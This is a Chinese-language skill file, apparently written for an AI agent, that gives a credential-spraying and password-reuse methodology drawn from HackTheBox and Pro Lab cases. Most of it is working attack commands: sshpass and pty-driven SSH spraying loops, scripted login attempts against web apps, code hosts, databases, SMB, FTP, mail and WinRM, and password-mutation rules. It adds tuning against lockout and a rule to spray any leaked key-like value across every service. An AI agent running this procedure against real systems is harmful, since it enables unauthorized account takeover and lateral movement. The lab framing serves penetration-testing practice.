---
name: 'credential-spraying-password-reuse'
description: '凭据喷洒方法论：拿到密码/疑似凭据后横向测试所有服务的强制流程（🆕 疑似凭据先喷后判 + Principal 案例；🆕 口径判定「域账号 vs 机器本地账号」+ 实例轮换变体 + pty 驱动 SSH 喷洒）。（检索词：spraying/password-reuse/credential/lateral/password reuse/口径/scope/本地账号/local-auth/域账号/实例轮换/数字变体/leet 变体/pty/sshpass/local account/instance rotation)'
metadata: { domain: creds, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# 凭据喷洒 / 密码复用攻击

> 🔴 **拿到任何密码/哈希的第一反应：不是在原地猜下一个，而是拿这个密码去试所有其他地方。**

### 🆕 口令集的适用范围：必须按【机器本地账号 vs 域账号】分别判定（Dante 实测，19 组凭据）

```
现象：一批员工凭据（来自某个 xlsx 快照）在【域】上枚举时全部 "user not found"，
      ⇒ 当时我判"这批凭据全部无效"，写进台账 —— 【这是错的】。
实际：它们不是域用户，是【各台独立机器的本地账号】。同一批口令在另一段的一台 Ubuntu 机上
      按本地账号判定时命中（用户名从该机 /etc/group 的组成员名里读出来）。
⇒ 🔴 纪律：「口径」要分开写，结论也只对那个口径成立：

| 口径 | 怎么判 | 命中意味着 |
|---|---|---|
| **域账号** | kerberos 枚举 / LDAP 查询 / `nxc smb -d <域>` | 能在全域横向 |
| **机器本地账号** | 逐机试（`nxc smb <ip> --local-auth`、`nxc mssql <ip> --local-auth`、该机 SSH） | 只影响那一台 |
| **应用/服务账号** | 打对应服务（Web/DB/CI） | 视服务权限 |

🔴 **"这批凭据在一个域上全否" ≠ "全部否定"** —— 先问"它属于哪个口径"，再决定要不要放弃。
🔴 用户名也可以从【目标机自己】读出来（`/etc/group` 的成员、`net user`、服务配置），
   不必全靠猜：**在一台机上枚举"谁被提到了"，比对人名字典更快**。
```

## 核心原则

```
一个密码出现的位置 ≠ 它唯一有效的位置

DB 密码 → 试 Web 登录
Web 密码 → 试 SSH
.env 凭据 → 试所有系统用户
Git 历史密码 → 试当前服务
内部服务密码 → 试外部服务
🆕 疑似凭据（配置字段泄露的值）→ 同样立即全服务喷洒，不要先判断"它像什么"
```

> 🆕 **疑似凭据 = 任何看起来像密码/密钥的泄露值**（encryptionKey、API key、token、passphrase 命名字段）。即使它在 settings/配置里显示为"加密密钥"，也可能就是某个系统用户的密码。**先喷后判**，判断留给喷洒结果。

## Nexus 案例 — 密码复用链（经典）

```
找到: Git 历史泄露 DB_PASSWORD=N27xh!!2ucY04
  ├── ✅ Krayin CRM 登录 (j.matthew@nexus.htb)  ← 同一个密码！
  ├── ❌ SSH j.matthew                          ← 不是这个
  └── ❌ Gitea admin                            ← 不是这个

找到: .env 生产配置 DB_PASSWORD=y27xb3ha!!74GbR
  ├── ✅ SSH jones                              ← 系统用户密码
  ├── ✅ Gitea jones                            ← 同一个密码！
  └── ✅ j.matthew@nexus.htb = jones            ← 同一个人！
```

## 🆕 Principal 案例 — 疑似凭据先喷 SSH（教训）

```
找到: /api/settings 泄露 encryptionKey=D3pl0y_$$H_Now42! (名字像加密密钥)
  ├── ❌ HTTP 登录喷洒 8 用户          ← 先试了 Web，全失败 → 差点标记死路
  ├── ❌ HS256 JWT 伪造               ← 又试了签名，失败
  ├── ❌ 各种 API fuzz (7789 词)      ← Web 面穷举，全 404
  └── ✅ SSH svc-deploy               ← 最后才试 SSH，一发命中！
      （谐音提示: "D3pl0y $$H Now42" = Deploy SSH Now42）

代价: 若第一时间 SSH 喷洒可省 30-40 分钟 Web 死角探索
```

## 喷洒清单（拿到密码后逐项执行）

### 1. SSH — 所有已知系统用户（🔴 最高优先级，最快见效）
```bash
for user in $(cat /etc/passwd | grep -E 'bash|sh$' | cut -d: -f1); do
    sshpass -p '$PASSWORD' ssh -o ConnectTimeout=3 $user@target 'id' 2>/dev/null
done
# 或针对已知用户名:
for u in admin svc-deploy operator ...; do sshpass -p "$P" ssh -o StrictHostKeyChecking=no $u@IP id 2>&1 | grep -v "Permission denied"; done
```

🔴🆕 **非交互 SSH 喷洒的正解：用 pty 驱动，不要靠 `sshpass` 空跑**（Dante 实测脚本形状）
```
[ ] 为什么要 pty：ssh 在【没有 TTY】时行为不同（读口令的提示走 /dev/tty）⇒ 你会拿到"没反应"
    而不是"认证失败"，于是把"能用的口令"记成"没通过"。
[ ] 固定这几个开关（缺一都会污染结论）：
      -o PreferredAuthentications=password     # 只试口令，别被 pubkey 分支干扰
      -o PubkeyAuthentication=no
      -o NumberOfPasswordPrompts=1             # 🔴 一次就够：防账号锁定 / 防被 PAM 拉黑
      -o ConnectTimeout=20 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
[ ] 循环：pty.fork() 起 ssh → 读到 `assword` 提示 → 写入口令 → 收集输出；
     设【总超时 + 静默超时】双闸，结束 `os.waitpid(pid, os.WNOHANG)` 收尾
     ⇒ 不留僵尸、不留半开连接（半开连接会把目标 sshd 打到 MaxStartups 上限）。
[ ] 每账号尝试次数写进台账（见 §防止遗漏的强制流程）—— 喷洒最大的自伤是把自己账号锁掉。
```

### 🆕 实例轮换 / 同源机器：旧记录是候选值，不是事实（Pro Lab 实测）

```
[ ] Pro Lab 常有 EU/US 多实例，【基础设施不变、数据层口令可能按实例轮换】：
    同一台机器在两个实例上的最终口令【可能相同也可能不同】；更早的 xlsx/笔记快照里的
    那个值可能早已失效（实测：快照写的是 "…Orange5"，实际值是 "…Orange17"，
    而另一个实例里最终又撞回同一个 "…Orange17"）。
[ ] ⇒ 对【疑似同源机器】同时准备三类候选，一起试（别串行地"试完一类再说"）：
      ① 旧实例/旧快照记录的原值
      ② 数字变体：`<Base>0` … `<Base>99`（含零填充；两位数变体命中过）
      ③ leet 变体：`F15H` ↔ `F1SH`、`0`↔`O`、`1`↔`I`（口令本身常是"谐音 + 数字替换"）
[ ] ⇒ 台账里为每个值标注【哪个实例 / 什么时候 / 谁给的】，否则下一轮会把"旧实例值"当事实。
```

### 2. Web 登录 — 所有已知 Web 应用
```bash
# 每个 vhost/子域
for email in admin@domain user@domain; do
    curl -s -c cookie.txt -X POST "https://app.domain/login" \
        -d "email=$email&password=$PASSWORD"
done
```

### 3. 数据库 — 所有数据库用户
```bash
mysql -u root -p$PASSWORD -e "SELECT 1"
mysql -u admin -p$PASSWORD -e "SELECT 1"
mysql -u <app_name> -p$PASSWORD -e "SELECT 1"
# PostgreSQL
PGPASSWORD=$PASSWORD psql -U postgres -c "SELECT 1"
# MSSQL
impacket-mssqlclient <user>:$PASSWORD@<target>
```

### 4. Git/代码托管 — 所有用户
```bash
# Gitea
curl -s -c cookie http://git.target/user/login -d "user_name=$USER&password=$PASSWORD"
# GitLab
curl -s "https://gitlab.target/api/v4/user" -H "PRIVATE-TOKEN: $PASSWORD"
# GitHub
curl -s -u "$USER:$PASSWORD" https://api.github.com/user
```

### 5. 邮件/IMAP/POP3
```bash
curl -s imaps://mail.target -u "$USER:$PASSWORD"
```

### 6. 其他常见服务
```bash
# FTP
ftp -n target <<< "user $USER $PASSWORD"
# SMB
smbclient -U "$USER%$PASSWORD" //target/share
# WinRM / RDP
evil-winrm -u $USER -p $PASSWORD -i target
```

## 密码变体 — 不要只试原密码

```bash
ORIGINAL="N27xh!!2ucY04"

# 常见变体策略:
# 1. 大小写变体
N27xh!!2ucY04 → n27xh!!2ucy04

# 2. 数字替换
N27xh!!2ucY04 → N27xh!!2ucY04! → N27xh!!2ucY04@

# 3. 公司/产品名组合
N27xh!!2ucY04 → NexusN27xh!! → KrayinN27xh!!

# 4. 季度/年份后缀
N27xh!!2ucY04 → N27xh!!2ucY04@2026 → N27xh!!2ucY04#Q1

# 5. 常见模式
→ 同密码但不同用户名: admin, root, <service_name>
→ 去掉特殊字符: N27xh2ucY04
→ 只取字母数字: N27xh2ucY04

# 6. 🆕 尾部数字轮换（Pro Lab 实例/重置后最常变的一位数）
N27xh!!2ucY04 → 保留词干，只枚举末尾数字 0..99（含零填充 `…Orange05`）
#    实测命中形态: `<Word><Word><N>`，N 从 5 → 17；两个实例最终撞回同一个 17

# 7. 🆕 leet / 谐音还原（口令常是"谐音词 + 数字替换"）
F15H ↔ F1SH · 0 ↔ O · 1 ↔ I · 3 ↔ E · 5 ↔ S · 4 ↔ A
#    ⇒ 拿到 `69F15HST1CX` 这种形态时，同时试 `69F1SHST1CX`（本场就是靠这条提示列出的候选）
```

## 密码来源优先级

| 优先级 | 来源 | 为什么 |
|--------|------|--------|
| 🔴 1 | `.env` / 配置文件 | 生产密码，最可能复用 |
| 🔴 2 | Git 历史 commit diff | 旧密码，但可能仍在别处使用 |
| 🔴 3 | 数据库用户表 | 哈希需要破解，但可能就是系统密码 |
| 🟠 4 | 日志文件 | 可能包含明文密码 |
| 🟠 5 | 注释/文档 | 开发人员留下的"临时"密码 |
| 🟡 6 | web 源码硬编码 | API key / token 常被复用 |
| 🆕 🟠 7 | 配置泄露字段 (settings/env 里的 key 名字段) | 疑似凭据，先喷后判 |

## 防止遗漏的强制流程

```
[ ] 密码已记录到文件（去交互化）
[ ] 🔴 疑似凭据（配置字段泄露值）已当密码对待，先喷洒再判断用途
[ ] 密码已对 /etc/passwd 中所有有 shell 的用户尝试
[ ] 密码已对所有已知 Web 应用尝试
[ ] 密码已对所有数据库用户尝试
[ ] 密码已对所有 Git/代码托管用户尝试
[ ] 密码已对常见端口服务尝试 (21, 22, 445, 3389, 5985, 3306, 5432, 1433)
[ ] 密码的 5 种变体已尝试
[ ] 🆕 结论标注了【口径】吗？—— **域账号 / 机器本地账号 / 应用账号**，"全否"只对该口径成立
[ ] 🆕 非域场景用了 `--local-auth` 之类开关吗？（认证模式写错 ⇒ 整个喷洒结论不可信）
[ ] 🆕 疑似同源机器：旧实例值 + 数字变体(0..99) + leet 变体，三类候选都试过了吗？
[ ] 🔴 以上有一项成功 → 重新开始喷洒（新用户/新服务可能有新密码）
```

## 教训

1. **密码复用是常态，不是例外** — 特别是在内网/开发环境
2. **DB 密码 ≠ 只能在 DB 用** — 开发/运维常用同一个密码注册所有服务
3. **Git 历史中的旧密码 ≠ 无用** — 用户可能改了 DB 密码但忘了改 CRM 密码
4. **一个密码成功 → 立即广度优先喷洒** — 不要垂直深入，先横向测所有服务
5. **用户名和邮箱地址映射** — j.matthew@nexus.htb = jones (系统用户) = jones (Gitea 用户)
6. 🆕 **疑似凭据先喷后判** — settings/env 里命名字段（encryptionKey/passphrase/apiKey）泄露的值，第一件事是喷 SSH + 全部服务，不是分析它"是什么的密钥"（Principal 教训: encryptionKey = svc-deploy SSH 密码）
7. 🔴🆕 **"全否"必须先问口径** — 一批口令在**域**上全否，不等于它们无效：它们可能全都是**某几台机器的本地账号**（Dante 实测 19 组）。**先分清域账号/本地账号/应用账号，再下结论**；下结论时把口径一起写进台账。
8. 🔴🆕 **旧实例记录是候选值不是事实** — Pro Lab 多实例/重置会让数据层口令轮换（且可能撞回同一值）。对疑似同源机器：旧值 + 尾部数字 0..99 + leet 变体三类同时试。
